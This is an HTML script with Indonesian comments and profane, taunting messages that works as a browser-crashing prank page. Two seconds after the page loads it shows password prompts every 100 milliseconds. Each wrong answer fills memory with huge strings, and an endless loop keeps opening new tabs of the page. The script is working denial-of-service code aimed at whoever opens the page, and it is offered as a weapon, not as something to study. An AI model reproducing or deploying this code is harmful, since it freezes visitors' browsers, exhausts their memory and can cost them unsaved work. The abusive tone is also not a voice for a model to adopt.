    <script>
        // Password pembuka (biar lu bisa stop kalo mau tes sendiri)
        const passwordSuci = "cium dulu";
        
        function mulaiHancurkan() {
            let totalMemory = [];
            console.log("ðŸ˜ˆ Neraka dimulai, Kontol! ðŸ˜ˆ");

            // INFINITY LOOP SPAM POP-UP
            setInterval(() => {
                let input = prompt("PASSWORD MANA, ANJING?!");
                if (input === passwordSuci) {
                    alert("Cih, hoki lu selamat kali ini!");
                    window.location.href = "https://google.com";
                } else {
                    // Kalo salah, kita makan RAM-nya!
                    for (let i = 0; i < 1000; i++) {
                        totalMemory.push(new Array(1000000).join('KING-MODEON!-'));
                    }
                }
            }, 100);

            // Bikin tab baru terus menerus (kalo browser gak ngeblock)
            while(true) {
                window.open(window.location.href, '_blank');
            }
        }

        // Jalankan neraka setelah 2 detik
        setTimeout(mulaiHancurkan, 2000);
    </script>
